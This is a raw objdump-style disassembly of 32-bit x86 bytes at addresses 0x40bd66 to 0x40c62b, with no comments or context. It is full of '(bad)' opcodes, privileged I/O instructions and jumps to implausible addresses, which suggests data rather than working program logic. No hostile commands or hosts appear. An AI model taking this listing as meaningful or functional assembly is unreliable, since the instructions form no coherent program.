  40bd66:	neg    BYTE PTR [ecx-0x1e736cc]
  40bd6c:	mov    cl,0xa0
  40bd6e:	pop    eax
  40bd6f:	imul   BYTE PTR [ecx+0x5ce09c]
	...
  40bd85:	add    BYTE PTR [eax],al
  40bd87:	add    BYTE PTR [edi],ah
  40bd89:	push   ebx
  40bd8a:	not    cl
  40bd8c:	psrld  mm6,mm5
  40bd8f:	fisubr WORD PTR [ebx]
  40bd91:	or     DWORD PTR [ebp-0x1eaccc29],edi
  40bd97:	pop    ds
  40bd98:	mov    bh,0x94
  40bd9a:	or     BYTE PTR [edx-0x8],ch
  40bd9d:	xchg   ebx,eax
  40bd9e:	jp     0x40bd75
  40bda0:	xchg   BYTE PTR [eax],ch
  40bda2:	mov    ebp,0xa52f3b7
  40bda7:	cdq    
  40bda8:	(bad)  
  40bdaa:	or     ecx,DWORD PTR [edi]
  40bdac:	adc    DWORD PTR [esi+eiz*1-0x1e69a2e6],ecx
  40bdb3:	sub    DWORD PTR [eax],edi
  40bdb5:	inc    edx
  40bdb6:	imul   ebp,DWORD PTR [eax],0xbc5188
  40bdbc:	mov    DWORD PTR [edx],edi
  40bdbe:	idiv   edi
  40bdc0:	sbb    eax,0xa5006256
  40bdc5:	in     eax,0x60
  40bdc7:	cli    
  40bdc8:	test   edi,edx
  40bdca:	or     bh,bh
  40bdcc:	or     BYTE PTR ds:0x7042fff4,al
  40bdd2:	mov    eax,0x5895a56c
  40bdd7:	push   0x47b8aa
  40bddc:	rol    BYTE PTR [ebx],cl
  40bdde:	mov    edx,0xee39c2fe
  40bde3:	mov    eax,ds:0x5a089551
  40bde8:	sbb    al,0x4e
  40bdea:	mov    dh,0x75
	...
  40be00:	pop    ebp
  40be01:	dec    esi
  40be02:	fdiv   DWORD PTR [ebp+0x69]
  40be05:	dec    esi
  40be06:	shl    DWORD PTR [ebx+edx*2-0x13],0xbc
  40be0b:	dec    eax
  40be0c:	and    al,0x95
  40be0e:	cmc    
  40be0f:	jne    0x40be7a
  40be11:	ins    DWORD PTR es:[edi],dx
  40be12:	mov    ecx,0xf73a4283
  40be17:	mov    ch,0x79
  40be19:	cmp    dh,bh
  40be1b:	call   DWORD PTR ds:0x3283f16d
  40be21:	cmp    al,BYTE PTR [esi-0x1]
  40be24:	mov    eax,0x3175f5a8
  40be29:	in     eax,0xf5
  40be2b:	jne    0x40be5a
  40be2d:	ins    DWORD PTR es:[edi],dx
  40be2e:	outs   dx,BYTE PTR ds:[esi]
  40be2f:	cli    
  40be30:	sar    BYTE PTR [ecx],cl
  40be32:	out    dx,al
  40be33:	icebp  
  40be34:	ret    0xf739
  40be37:	lea    ebp,[eax+0x53]
  40be3a:	hlt    
  40be3b:	jmp    DWORD PTR [edx]
  40be3d:	in     eax,0xf5
  40be3f:	mov    ch,0x71
  40be41:	aaa    
  40be42:	idiv   edi
  40be44:	std    
  40be45:	(bad)  [ecx+0x0]
  40be48:	mov    WORD PTR [ebx],?
  40be4a:	mov    DWORD PTR [edi-0x1d7477d],edi
  40be50:	retf   
  40be51:	sbb    edi,ebp
  40be53:	mov    ah,0x0
  40be55:	shr    esi,1
  40be57:	(bad)  
  40be58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be59:	stos   BYTE PTR es:[edi],al
  40be5a:	push   ecx
  40be5b:	add    BYTE PTR [edx+eax*8-0x46554848],cl
  40be62:	out    dx,al
  40be63:	out    0x0,eax
	...
  40be75:	add    BYTE PTR [eax],al
  40be77:	add    ch,cl
  40be79:	jno    0x40be6a
  40be7b:	inc    ch
  40be7d:	jl     0x40be98
  40be7f:	add    BYTE PTR [ecx],bh
  40be81:	mov    dh,0xdd
  40be83:	inc    BYTE PTR [ecx]
  40be85:	dec    edx
  40be86:	out    dx,eax
  40be87:	je     0x40be25
  40be89:	mov    ?,WORD PTR [eax+0xc]
  40be8c:	jnp    0x40be9f
  40be8e:	repnz out 0xf9,eax
  40be91:	sub    dh,0xfe
  40be94:	push   ebp
  40be95:	jl     0x40be94
  40be97:	(bad)  
  40be98:	mov    eax,0x5082ddc2
  40be9d:	scas   al,BYTE PTR es:[edi]
  40be9e:	inc    esi
  40be9f:	(bad)  
  40bea0:	fnstenv [ecx-0x2e]
  40bea3:	mov    edx,0xaee9710
  40bea8:	dec    esp
  40bea9:	leave  
  40beaa:	or     BYTE PTR [edi+0x45],bl
  40bead:	jl     0x40beac
  40beaf:	push   DWORD PTR [edx]
  40beb1:	leave  
  40beb2:	sbb    eax,ebp
  40beb4:	test   cl,0xeb
  40beb7:	(bad)  
  40beb8:	xchg   edi,eax
  40beb9:	std    
  40beba:	gs add eax,0xbcaf4bb
  40bec0:	mov    WORD PTR [esi+0x66],ds
  40bec3:	or     al,0xf4
  40bec5:	add    DWORD PTR [ebx-0x2],esi
  40bec8:	add    eax,DWORD PTR [ebx-0x36]
  40becb:	je     0x40be58
  40becd:	aad    0xb8
  40becf:	inc    edi
  40bed0:	dec    ebp
  40bed1:	cmp    eax,0x949874ed
  40bed6:	xchg   edi,eax
  40bed7:	add    cl,BYTE PTR [edi]
  40bed9:	push   eax
  40beda:	xchg   edi,eax
  40bedb:	fld    DWORD PTR [eax]
	...
  40beed:	add    BYTE PTR [eax],al
  40beef:	add    BYTE PTR [ebp+0x58e4dfba],al
  40bef5:	mov    al,ds:0x500dee87
  40befa:	(bad)  
  40befb:	jnp    0x40bf45
  40befd:	dec    eax
  40befe:	sbb    BYTE PTR [ebp-0x1b202aa5],bl
  40bf04:	cmp    BYTE PTR [eax-0x78],cl
  40bf07:	fimul  WORD PTR ds:0x487b6f50
  40bf0d:	dec    esp
  40bf0e:	fcomp  st(1)
  40bf10:	cwde   
  40bf11:	xchg   esp,eax
  40bf12:	(bad)  
  40bf14:	cmp    al,0xcf
  40bf16:	inc    esi
  40bf17:	in     eax,0x14
  40bf19:	(bad)  [ebx+0x5c]
  40bf1c:	mov    WORD PTR [edi+ebx*8-0x41279bfd],fs
  40bf23:	in     al,0x72
  40bf25:	sbb    eax,0xc96af3ad
  40bf2a:	daa    
  40bf2b:	fsub   QWORD PTR [edx+0x13]
  40bf2e:	pop    ss
  40bf2f:	in     eax,0x86
  40bf31:	push   esp
  40bf32:	out    dx,eax
  40bf33:	jg     0x40bf45
  40bf35:	xchg   esp,eax
  40bf36:	fild   WORD PTR [ebx]
  40bf38:	dec    ebx
  40bf39:	leave  
  40bf3a:	pop    es
  40bf3b:	pop    esp
  40bf3c:	xor    al,0x51
  40bf3e:	loopne 0x40bf43
  40bf40:	cmp    ecx,ecx
  40bf42:	sti    
  40bf43:	fcomi  st,st(1)
  40bf45:	mov    ecx,0x4c0f03df
  40bf4a:	loop   0x40bf40
  40bf4c:	or     eax,edi
  40bf4e:	fild   WORD PTR [ebx]
  40bf50:	mov    WORD PTR [ebx],ds
  40bf52:	pop    ebp
  40bf53:	call   0x40bf58
	...
  40bf68:	xchg   ebx,eax
  40bf69:	(bad)  
  40bf6a:	fcomip st,st(4)
  40bf6c:	cvttps2pi mm4,xmm0
  40bf6f:	add    ecx,DWORD PTR [esp+edi*4-0x6bb29c85]
  40bf76:	or     BYTE PTR [esi],bl
  40bf78:	shl    al,1
  40bf7a:	popa   
  40bf7b:	jmp    0x1e095b0f
  40bf80:	jno    0x40bfd1
  40bf82:	jl     0x40bf25
  40bf84:	aaa    
  40bf85:	dec    edi
  40bf86:	push   es
  40bf87:	jmp    0x99bd0f1b
  40bf8c:	addr16 push es
  40bf8e:	inc    ecx
  40bf8f:	sub    BYTE PTR [eax+0x4f09cdbc],cl
  40bf95:	xchg   esp,eax
  40bf96:	pop    ebp
  40bf97:	cmp    DWORD PTR [edx+edi*4],0xea4e908
  40bf9e:	jge    0x40bf61
  40bfa0:	test   al,0xc7
  40bfa2:	lock ror DWORD PTR [esi+0x4ec9b4bc],cl
  40bfa9:	xchg   esp,eax
  40bfaa:	pop    ebp
  40bfab:	inc    ecx
  40bfac:	(bad)  
  40bfad:	mov    edx,0x460ce908
  40bfb2:	or     BYTE PTR [edx+ebp*4+0x68397c4d],dh
  40bfb9:	leave  
  40bfba:	cld    
  40bfbb:	inc    ecx
  40bfbc:	test   eax,0xbf26f612
  40bfc1:	sbb    ecx,ebx
  40bfc3:	adc    dl,BYTE PTR [esi-0x32]
  40bfc6:	xor    al,dh
  40bfc8:	loop   0x40bf5b
  40bfca:	into   
  40bfcb:	jmp    0x40bfcd
	...
  40bfdd:	add    BYTE PTR [eax],al
  40bfdf:	add    bl,dl
  40bfe1:	rol    BYTE PTR [ecx],cl
  40bfe3:	sbb    esi,DWORD PTR [ebx-0x703c7769]
  40bfe9:	(bad)  
  40bfea:	out    0xf6,al
  40bfec:	mov    eax,ds:0xb9ee58a4
  40bff1:	pushf  
  40bff2:	loopne 0x40bfa2
  40bff4:	cs dec edi
  40bff6:	not    cl
  40bff8:	scas   eax,DWORD PTR es:[edi]
  40bff9:	into   
  40bffa:	cmc    
  40bffb:	(bad)  
  40bffc:	and    esp,DWORD PTR [eax+0x4f0054f5]
  40c002:	jl     0x40c004
  40c004:	inc    ebp
  40c005:	xor    bh,BYTE PTR [ebp+0x8]
  40c008:	frstor [esi]
  40c00a:	hlt    
  40c00b:	(bad)  
  40c00c:	cmp    dh,BYTE PTR ds:0x315cc03b
  40c012:	idiv   edi
  40c014:	sub    ah,BYTE PTR [edi-0x5c]
  40c017:	cmp    dl,dh
  40c019:	mov    ds:0x31fa688b,al
  40c01e:	idiv   edi
  40c020:	mov    al,ds:0x8b55ee6c
  40c025:	xor    edi,esi
  40c027:	inc    eax
  40c029:	popa   
  40c02a:	out    dx,al
  40c02b:	dec    ebp
  40c02c:	mov    ebx,0xa0fff732
  40c031:	imul   ebp,esi,0xf732ab45
  40c037:	inc    eax
  40c039:	ins    DWORD PTR es:[edi],dx
  40c03a:	out    dx,al
  40c03b:	cmp    eax,0xfff732bb
  40c040:	pusha  
  40c041:	inc    ecx
  40c042:	div    DWORD PTR [ebp+0x0]
	...
  40c055:	add    BYTE PTR [eax],al
  40c057:	add    BYTE PTR [ecx+0x32],bh
  40c05a:	jge    0x40c064
  40c05c:	fucom  st(6)
  40c05e:	idiv   bh
  40c060:	mov    edx,0x49c2bfd1
  40c065:	xchg   ecx,eax
  40c066:	pop    ebx
  40c067:	mov    edi,DWORD PTR [ecx+0x15]
  40c06a:	retf   0x7ae8
  40c06d:	jmp    0x40c08b
  40c06f:	push   eax
  40c071:	inc    eax
  40c072:	out    dx,al
  40c073:	lea    ecx,[edi]
  40c075:	xchg   ecx,eax
  40c076:	or     BYTE PTR [ebx],cl
  40c078:	jne    0x40c066
  40c07a:	pop    ebp
  40c07b:	push   0x25
  40c07d:	mov    ecx,0x90e460c4
  40c082:	cmc    
  40c083:	jne    0x40c0ca
  40c085:	xor    bh,BYTE PTR [ebp+0xc]
  40c088:	cmp    eax,0x3aff894e
  40c08d:	sahf   
  40c08e:	enter  0x8c74,0x7c
  40c092:	cmp    al,0x50
  40c094:	hlt    
  40c095:	lock cmp dh,0x3
  40c099:	inc    edx
  40c09a:	retf   0xbd73
  40c09d:	les    eax,FWORD PTR [eax-0x18]
  40c0a0:	popaw  
  40c0a2:	loop   0x40c0e5
  40c0a4:	push   cs
  40c0a5:	(bad)  
  40c0a6:	jmp    0x61fe:0xf5aecc0a
  40c0ad:	xchg   ebx,eax
  40c0ae:	cmp    al,0xe8
  40c0b0:	mov    esp,0x5cfeeabb
  40c0b5:	push   ds
  40c0b6:	push   ecx
  40c0b7:	call   0x891d718
	...
  40c0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0d1:	popa   
  40c0d2:	call   0xc75374d5
  40c0d7:	jl     0x40c084
  40c0d9:	mov    ebp,0xe2b474ea
  40c0de:	into   
  40c0df:	jl     0x40c07c
  40c0e1:	in     eax,dx
  40c0e2:	loope  0x40c0a1
  40c0e4:	adc    esi,esp
  40c0e6:	jmp    0x7400:0xa358c67
  40c0ed:	xchg   DWORD PTR [eax-0x1],ebp
  40c0f0:	jnp    0x40c0b7
  40c0f2:	inc    eax
  40c0f3:	clc    
  40c0f4:	add    ecx,edi
  40c0f6:	aad    0x4f
  40c0f8:	imul   eax,DWORD PTR [ecx],0xfffffffa
  40c0fb:	(bad)  
  40c0fc:	fld    DWORD PTR [ecx-0x1e]
  40c0ff:	shl    ebp,cl
  40c101:	cmp    eax,0x294c0b0a
  40c106:	pop    edx
  40c107:	(bad)  
  40c108:	shr    DWORD PTR [ebp+0x3d8c0009],1
  40c10e:	ret    
  40c10f:	inc    esp
  40c110:	inc    eax
  40c111:	dec    ebx
  40c112:	add    BYTE PTR [eax],al
  40c114:	mov    WORD PTR [edi],ss
  40c116:	or     ch,BYTE PTR [edx-0x74]
  40c119:	pop    ss
  40c11a:	or     ch,BYTE PTR [edx-0x74]
  40c11d:	xchg   esp,eax
  40c11e:	jl     0x40c167
  40c120:	and    ch,ah
  40c122:	(bad)  
  40c123:	push   edi
  40c124:	adc    al,0x4c
  40c126:	push   ebp
  40c127:	aam    0xa
  40c129:	ret    0xecc3
  40c12c:	xor    DWORD PTR [esi+0x548703df],edi
  40c132:	cmp    al,0x6
	...
  40c148:	out    0x8e,eax
  40c14a:	inc    edi
  40c14b:	cwde   
  40c14c:	push   ebx
  40c14d:	aad    0xdf
  40c14f:	loopne 0x40c1a9
  40c151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c152:	xchg   edi,eax
  40c153:	push   es
  40c154:	or     eax,0x58e1974c
  40c159:	dec    esp
  40c15a:	xor    ah,ch
  40c15c:	pop    eax
  40c15d:	adc    eax,0xd214e187
  40c162:	fwait
  40c163:	loope  0x40c1a5
  40c165:	lods   al,BYTE PTR ds:[esi]
  40c166:	jbe    0x40c1bf
  40c168:	cwde   
  40c169:	dec    ebx
  40c16a:	cmc    
  40c16b:	out    dx,eax
  40c16c:	stos   BYTE PTR es:[edi],al
  40c16d:	rcl    ebx,0xe0
  40c170:	sbb    BYTE PTR [edi+edx*2+0x574b9afb],bl
  40c177:	loope  0x40c191
  40c179:	cmp    BYTE PTR [eax+0x1d],cl
  40c17c:	or     DWORD PTR [edi+eax*2-0x1f],ecx
  40c180:	enter  0x5b44,0x81
  40c184:	jp     0x40c147
  40c186:	xor    ebp,esp
  40c188:	aad    0xbd
  40c18a:	fild   WORD PTR [ebx]
  40c18c:	imul   eax,ecx,0x37
  40c18f:	in     al,dx
  40c190:	test   eax,0x44e12ec9
  40c195:	push   esi
  40c196:	cld    
  40c197:	add    edi,DWORD PTR [ecx+0x4f830c1f]
  40c19d:	inc    eax
  40c19e:	push   es
  40c19f:	loope  0x40c1e3
  40c1a1:	mov    esi,0x4b706ddf
  40c1a6:	jge    0x40c1b3
  40c1a8:	and    al,0xd1
  40c1aa:	or     BYTE PTR [ebx+0x0],dh
	...
  40c1bd:	add    BYTE PTR [eax],al
  40c1bf:	add    BYTE PTR [edx+ecx*2],ch
  40c1c2:	and    BYTE PTR [ebx+eax*2-0x5079f3ae],0xd5
  40c1ca:	or     cl,ch
  40c1cc:	(bad)  
  40c1cd:	xchg   esp,eax
  40c1ce:	or     BYTE PTR [edx+edx*1+0x42],ah
  40c1d2:	test   esi,0xed60daec
  40c1d8:	mov    ss,WORD PTR [eax+ecx*1+0x8b33cd1]
  40c1df:	jmp    0x28a87c5b
  40c1e4:	mov    BYTE PTR [esi+ebp*2+0x60944f08],bh
  40c1eb:	imul   ebp,DWORD PTR [esi-0x2b],0x6ca29608
  40c1f2:	inc    ecx
  40c1f3:	sub    BYTE PTR [eax-0x580e83b5],cl
  40c1f9:	repnz idiv BYTE PTR [esi-0x54]
  40c1fd:	mov    dl,0x66
  40c1ff:	or     BYTE PTR [edi-0x6c],cl
  40c202:	pusha  
  40c203:	pop    es
  40c204:	das    
  40c205:	aad    0x8
  40c207:	ror    DWORD PTR [edi],1
  40c209:	mov    ah,0x47
  40c20b:	jmp    0xe9495837
  40c210:	cmovnp edi,DWORD PTR [ecx+eiz*8+0x77]
  40c215:	push   ds
  40c216:	test   DWORD PTR [esi+0x6c],0x6d368c19
  40c21d:	dec    ebx
  40c21e:	neg    BYTE PTR [ecx-0x169f1d89]
	...
  40c238:	(bad)  
  40c23c:	ins    BYTE PTR es:[edi],dx
  40c23d:	rol    DWORD PTR [eax],0x11
  40c240:	push   edx
  40c241:	int3   
  40c242:	cmc    
  40c243:	push   ss
  40c244:	push   esi
  40c245:	push   esp
  40c246:	or     eax,0xe51d7ae9
  40c24b:	add    BYTE PTR [ecx+edx*2+0x6a32fefa],ah
  40c252:	pusha  
  40c253:	add    BYTE PTR [edi],cl
  40c255:	jae    0x40c24c
  40c257:	jne    0x40c286
  40c259:	ds mov ah,0x79
  40c25c:	xor    ch,BYTE PTR [edx-0x7f]
  40c25f:	inc    ebp
  40c260:	xor    DWORD PTR [edi+0x1149e812],edi
  40c266:	idiv   edi
  40c268:	out    dx,al
  40c269:	push   ebp
  40c26a:	jp     0x40c290
  40c26c:	pop    ebp
  40c26d:	mov    edx,0x85e54167
  40c272:	loopne 0x40c2d4
  40c274:	jne    0x40c2df
  40c276:	not    DWORD PTR [eax+0x4d]
  40c279:	nop
  40c27a:	sbb    bh,ch
  40c27c:	jae    0x40c236
  40c27e:	mov    edx,0x5890a461
  40c283:	jmp    FWORD PTR [eax+0x484be098]
  40c289:	imul   esi,edi,0xf5b499e8
  40c28f:	(bad)  
  40c290:	jmp    0x790:0x7460959b
  40c297:	add    BYTE PTR [ebp+0x858395],dh
	...
  40c2ad:	add    BYTE PTR [eax],al
  40c2af:	add    BYTE PTR [edx],bh
  40c2b1:	push   0xfffffff7
  40c2b3:	call   ebp
  40c2b5:	mov    ebp,0x9575010c
  40c2ba:	loopne 0x40c2b5
  40c2bc:	dec    edx
  40c2bd:	xchg   ebp,eax
  40c2be:	or     BYTE PTR [eax+0x63],ch
  40c2c1:	mov    al,0x47
  40c2c3:	add    BYTE PTR [ebp-0x51],bl
  40c2c6:	addr16 inc ecx
  40c2c8:	jne    0x40c287
  40c2ca:	mov    BYTE PTR [ecx+0x34],ah
  40c2cd:	xchg   ebp,eax
  40c2ce:	cmc    
  40c2cf:	xor    eax,0x47d8cd
  40c2d4:	jb     0x40c2c1
  40c2d6:	add    al,ch
  40c2d8:	mov    WORD PTR [ebp+0x1343fee7],gs
  40c2de:	fs popa 
  40c2e0:	int    0x3b
  40c2e2:	bound  esp,QWORD PTR [esi-0x53]
  40c2e5:	cld    
  40c2e6:	or     DWORD PTR [eax+0xc],ebp
  40c2e9:	sbb    al,0x4d
  40c2eb:	add    BYTE PTR [ebp+edi*1+0x320c000a],dh
  40c2f2:	push   ecx
  40c2f3:	or     BYTE PTR [ecx+eax*1],ah
  40c2f6:	jmp    0x80f0cef9
  40c2fb:	test   BYTE PTR [edx],0x5a
  40c2fe:	xlat   BYTE PTR ds:[ebx]
  40c2ff:	dec    edi
  40c300:	in     al,0x1c
  40c302:	outs   dx,DWORD PTR ds:[esi]
  40c303:	add    BYTE PTR [edx+ecx*1-0x781403af],cl
  40c30a:	add    al,0xe8
  40c30c:	imul   eax,DWORD PTR [ebp+edx*8+0xdfcc5fe],0x0
	...
  40c328:	cmp    esi,eax
  40c32a:	in     eax,0x80
  40c32c:	shl    BYTE PTR [esi],1
  40c32e:	aam    0xfe
  40c330:	ret    
  40c331:	xchg   esp,eax
  40c332:	or     al,0x6a
  40c334:	jb     0x40c348
  40c336:	push   ecx
  40c337:	or     BYTE PTR [edx+eax*2-0x4c5400ab],ah
  40c33e:	inc    eax
  40c33f:	cld    
  40c340:	retf   
  40c341:	das    
  40c342:	ja     0x40c3a3
  40c344:	dec    ebp
  40c345:	cmp    ecx,DWORD PTR [edx]
  40c347:	add    BYTE PTR [ebx+edi*1-0x1f7c7b67],cl
  40c34e:	(bad)  
  40c34f:	(bad)  
  40c350:	fcom   QWORD PTR [ebp+0xe]
  40c353:	add    DWORD PTR [ebp+edi*1+0x3deb71e2],ecx
  40c35a:	or     ch,BYTE PTR [eax+0x59]
  40c35d:	pop    ebp
  40c35e:	dec    ebp
  40c35f:	add    ah,dh
  40c361:	jp     0x40c3cf
  40c363:	inc    ecx
  40c364:	mov    WORD PTR [edi+edx*4-0x202a137d],ss
  40c36b:	fiadd  WORD PTR [eax-0x73bb5794]
  40c371:	inc    edi
  40c372:	popf   
  40c373:	or     esp,DWORD PTR [esp+edi*4]
  40c376:	or     al,0xde
  40c378:	xor    bh,BYTE PTR [ebp-0x6b329bdc]
  40c37e:	xchg   edx,eax
  40c380:	lods   al,BYTE PTR ds:[esi]
  40c381:	aad    0xdf
  40c383:	imul   ecx,DWORD PTR [esi+esi*4],0x20
  40c387:	add    al,0xa4
  40c389:	xchg   edx,eax
  40c38a:	fild   WORD PTR [ebx]
	...
  40c3a0:	or     al,0x48
  40c3a2:	push   ebp
  40c3a3:	or     al,0xf4
  40c3a5:	xlat   BYTE PTR ds:[ebx]
  40c3a6:	(bad)  
  40c3a7:	(bad)  
  40c3a9:	sbb    DWORD PTR [ebp-0x2b],esp
  40c3ac:	icebp  
  40c3ad:	inc    edi
  40c3ae:	mov    bh,0x34
  40c3b0:	hlt    
  40c3b1:	stos   DWORD PTR es:[edi],eax
  40c3b2:	inc    esi
  40c3b3:	add    al,0x8c
  40c3b5:	inc    edi
  40c3b6:	cmp    eax,0xf7c1dae0
  40c3bb:	jmp    0x40c370
  40c3bd:	int3   
  40c3be:	xchg   esi,eax
  40c3bf:	fst    st(4)
  40c3c1:	push   edx
  40c3c2:	in     al,0x3
  40c3c4:	pop    ecx
  40c3c5:	sbb    esi,DWORD PTR [ebx+eax*4-0x31]
  40c3c9:	inc    eax
  40c3ca:	mov    ds,ebp
  40c3cc:	mov    dl,0xba
  40c3ce:	fild   QWORD PTR [ecx+0x73]
  40c3d1:	inc    edi
  40c3d2:	cmc    
  40c3d3:	or     esi,DWORD PTR [ebp+edx*1+0x1d9adcf8]
  40c3da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3db:	(bad)  
  40c3dd:	xchg   ecx,eax
  40c3de:	jbe    0x40c444
  40c3e0:	int    0x94
  40c3e2:	fild   WORD PTR [ebx]
  40c3e4:	mov    WORD PTR [esp+edx*2+0x4f468287],ss
  40c3eb:	ffree  st(3)
  40c3ed:	mov    esp,0x948c02eb
  40c3f2:	or     BYTE PTR [ecx+0x75],al
  40c3f5:	mov    cl,0x8
  40c3f7:	jmp    0xa8a8f3e3
  40c3fc:	(bad)  
  40c3fd:	mov    esp,0x94ce88e7
  40c402:	pusha  
  40c403:	imul   eax,DWORD PTR [eax],0x0
	...
  40c415:	add    BYTE PTR [eax],al
  40c417:	add    BYTE PTR [edi-0x5cf1f72b],ch
  40c41d:	ins    BYTE PTR es:[edi],dx
  40c41e:	inc    ecx
  40c41f:	test   al,0x8f
  40c421:	inc    edi
  40c422:	jl     0x40c415
  40c424:	aaa    
  40c425:	xor    esi,ebp
  40c427:	test   BYTE PTR [eax-0x51],0xed
  40c42b:	mov    dh,cl
  40c42d:	xchg   esp,eax
  40c42e:	pusha  
  40c42f:	enter  0xd5ae,0x8
  40c433:	push   ecx
  40c434:	adc    BYTE PTR [edi+eax*2+0x89277e9],dh
  40c43b:	jmp    0xf1bd0a4f
  40c440:	out    0x4e,eax
  40c442:	cmc    
  40c443:	mov    esi,0xbe8c17c8
  40c448:	rol    DWORD PTR [ebp-0xa],0x19
  40c44c:	call   0x902a3373
  40c451:	inc    edi
  40c452:	jl     0x40c3f1
  40c454:	call   0x86c1c518
  40c459:	int3   
  40c45a:	cmc    
  40c45b:	mov    es,esi
  40c45d:	push   esp
  40c45e:	or     eax,0xe51b7ae9
  40c463:	push   0x76f742d3
  40c468:	sar    BYTE PTR [eax+ecx*1+0x7c476803],0xf1
  40c470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c471:	dec    esp
  40c472:	jle    0x40c4d2
  40c474:	push   0x48554c1d
  40c479:	xchg   ecx,eax
  40c47a:	xchg   ebp,eax
  40c47b:	leave  
	...
  40c490:	into   
  40c491:	xchg   esp,eax
  40c492:	or     BYTE PTR [eax],al
  40c494:	gs xchg edx,eax
  40c496:	or     BYTE PTR [ebp-0xb9f10],cl
  40c49c:	call   0x892:0x64046081
  40c4a3:	call   0x4974a9
  40c4a8:	sbb    eax,0x35416969
  40c4ad:	mov    edx,0x91e461fd
  40c4b2:	pusha  
  40c4b3:	add    BYTE PTR [ebx+edx*8],0x8
  40c4b7:	jmp    eax
  40c4b9:	or     DWORD PTR [esi+0x41],ecx
  40c4bc:	xor    eax,0x8d087d69
  40c4c1:	xchg   ah,dh
  40c4c3:	jmp    FWORD PTR [edx]
  40c4c5:	mov    ecx,0x90b461f5
  40c4ca:	pusha  
  40c4cb:	not    DWORD PTR [edi+ecx*8+0x8]
  40c4cf:	push   0x47af65
  40c4d4:	pop    ebp
  40c4d5:	mov    cs,WORD PTR [eax]
  40c4d7:	add    BYTE PTR [ebp+0x69],dh
  40c4da:	jge    0x40c4e4
  40c4dc:	int    0xcf
  40c4de:	hlt    
  40c4df:	jmp    FWORD PTR [edx]
  40c4e1:	sbb    al,0x8d
  40c4e3:	imul   DWORD PTR [ebx]
  40c4e5:	push   0xfffffff7
  40c4e7:	push   eax
  40c4e8:	sbb    eax,0xb5006e9c
  40c4ed:	push   0x7d
  40c4ef:	cld    
  40c4f0:	or     ah,ah
  40c4f2:	add    al,ch
	...
  40c508:	pop    ss
  40c509:	loop   0x40c500
  40c50b:	(bad)  
  40c50c:	fmul   QWORD PTR [esi+0xa]
  40c50f:	add    BYTE PTR [eax-0xe7c1deb],al
  40c515:	ins    BYTE PTR es:[edi],dx
  40c516:	pusha  
  40c517:	add    BYTE PTR [edi+0x7d75f578],bh
  40c51d:	cmp    DWORD PTR [edi+esi*2-0x74],edi
  40c521:	(bad)  
  40c523:	mov    cl,dl
  40c525:	xlat   BYTE PTR ds:[ebx]
  40c526:	data16 add ah,ah
  40c529:	xchg   edi,eax
  40c52a:	outs   dx,BYTE PTR ds:[esi]
  40c52b:	inc    ecx
  40c52c:	mov    WORD PTR [ebx-0x4],fs
  40c52f:	popa   
  40c530:	int    0x3b
  40c532:	shl    DWORD PTR [esp+esi*1],cl
  40c535:	repz dec esp
  40c537:	add    BYTE PTR [edi+ebp*1+0x51],ah
  40c53b:	dec    DWORD PTR [ebx+0x42]
  40c53e:	retf   0xa573
  40c541:	or     esp,DWORD PTR [edx+0x0]
  40c544:	mov    WORD PTR [esi-0x70],es
  40c547:	addr16 js 0x40c563
  40c54a:	dec    ebp
  40c54b:	add    BYTE PTR [esi+eax*2+0x3d340859],bh
  40c552:	lods   al,BYTE PTR ds:[esi]
  40c553:	(bad)  
  40c554:	sbb    edx,DWORD PTR [ebx+0x2e137a09]
  40c55a:	add    BYTE PTR fs:[edx+eiz*4+0x6e],dh
  40c55f:	inc    ecx
  40c560:	mov    ebx,ss
  40c562:	(bad)  
  40c563:	popa   
  40c564:	dec    ebp
  40c565:	cmp    edx,ebx
  40c567:	xor    al,0xd4
  40c569:	or     BYTE PTR [ebx+0x0],0x0
	...
  40c57d:	add    BYTE PTR [eax],al
  40c57f:	add    ah,dh
  40c581:	inc    edx
  40c582:	push   ecx
  40c583:	jmp    ebx
  40c585:	xor    edx,ecx
  40c587:	jae    0x40c5fe
  40c589:	stos   DWORD PTR es:[edi],eax
  40c58a:	add    BYTE PTR fs:[esi+ebx*1-0x667f9870],cl
  40c592:	dec    ebx
  40c593:	add    BYTE PTR [esi+ebx*1+0x59],bl
  40c597:	or     BYTE PTR [eax+esi*8+0x22b3feab],ah
  40c59e:	mov    edi,0xd2c5ab78
  40c5a3:	je     0x40c545
  40c5a5:	mov    ebp,0x6ca40858
  40c5aa:	pop    ecx
  40c5ab:	call   DWORD PTR [ebx-0x703ac76d]
  40c5b1:	xchg   esp,eax
  40c5b2:	mov    esp,0x2418778e
  40c5b7:	xlat   BYTE PTR ds:[ebx]
  40c5b8:	loope  0x40c5a5
  40c5ba:	leave  
  40c5bb:	add    esp,esi
  40c5bd:	outs   dx,BYTE PTR ds:[esi]
  40c5be:	dec    esi
  40c5bf:	push   eax
  40c5c0:	xchg   esp,eax
  40c5c1:	sub    al,0x58
  40c5c3:	push   ecx
  40c5c4:	arpl   WORD PTR [ecx+ebp*2+0x40],ax
  40c5c8:	pop    eax
  40c5c9:	scas   eax,DWORD PTR es:[edi]
  40c5ca:	fucomip st,st(3)
  40c5cc:	push   ecx
  40c5cd:	ret    0xda2e
  40c5d0:	xchg   esi,eax
  40c5d1:	push   esp
  40c5d2:	pushf  
  40c5d3:	cld    
  40c5d4:	shr    DWORD PTR [edi+ebx*8-0x77fcd4fd],cl
  40c5db:	inc    esp
  40c5dc:	scas   al,BYTE PTR es:[edi]
  40c5dd:	aad    0xdf
  40c5df:	xor    ebp,DWORD PTR [ebx]
  40c5e1:	retf   0xebf7
	...
  40c5f8:	mov    ds:0x33d9fef6,eax
  40c5fd:	push   cs
  40c5fe:	jns    0x40c5da
  40c600:	adc    dl,BYTE PTR [eax]
  40c602:	adc    eax,0xdfd55438
  40c607:	mov    eax,es
  40c609:	mov    ah,0x27
  40c60b:	inc    ebx
  40c60c:	mov    WORD PTR [edi+eax*1],ss
  40c60f:	add    al,0x78
  40c611:	fst    DWORD PTR [edi+0x4a]
  40c614:	outs   dx,BYTE PTR ds:[esi]
  40c615:	aad    0xdf
  40c617:	xor    ah,dh
  40c619:	xor    eax,0x8f8c0445
  40c61e:	lahf   
  40c61f:	push   eax
  40c620:	jae    0x40c60c
  40c622:	xchg   edi,eax
  40c623:	(bad)  
  40c624:	cmove  edx,DWORD PTR [edi-0x206bcbcc]
  40c62b:	call   0x66617329
